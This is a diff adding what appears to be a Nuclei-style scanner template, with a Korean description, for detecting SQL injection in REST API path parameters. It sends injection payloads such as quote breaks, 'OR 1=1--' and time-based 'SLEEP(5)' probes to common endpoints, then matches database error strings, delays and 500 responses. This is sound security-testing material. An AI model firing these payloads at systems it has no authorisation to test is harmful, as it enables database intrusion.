@@ -1,0 +1,54 @@
+id: sqli-rest-api-path
+
+info:
+  name: SQL Injection via REST API Path Parameters
+  author: security-researcher
+  severity: high
+  description: |
+    REST API의 URL 경로(path) 파라미터를 통한 SQL 인젝션 취약점을 탐지합니다.
+    /api/users/1, /api/products/123 형태의 경로에서 발생합니다.
+  tags: sqli,rest-api,path-parameter,injection
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/users/1'"
+      - "{{BaseURL}}/api/users/1%27"
+      - "{{BaseURL}}/api/users/1 OR 1=1--"
+      - "{{BaseURL}}/api/users/1' AND '1'='1"
+      - "{{BaseURL}}/api/users/1 AND SLEEP(5)--"
+      - "{{BaseURL}}/api/products/1'"
+      - "{{BaseURL}}/api/products/1 OR 1=1--"
+      - "{{BaseURL}}/api/items/1'"
+      - "{{BaseURL}}/api/posts/1'"
+      - "{{BaseURL}}/api/articles/1'"
+      - "{{BaseURL}}/api/orders/1'"
+      - "{{BaseURL}}/api/v1/users/1'"
+      - "{{BaseURL}}/api/v2/users/1'"
+      - "{{BaseURL}}/rest/user/1'"
+      - "{{BaseURL}}/rest/product/1'"
+
+    headers:
+      Accept: application/json
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "you have an error in your sql syntax"
+          - "ORA-\\d{5}"
+          - "Microsoft OLE DB"
+          - "PostgreSQL.*ERROR"
+          - "SQLite.*error"
+          - "sql.*error|syntax.*error"
+        condition: or
+        case-insensitive: true
+
+      - type: dsl
+        dsl:
+          - "duration >= 5000"
+
+      - type: status
+        status:
+          - 500
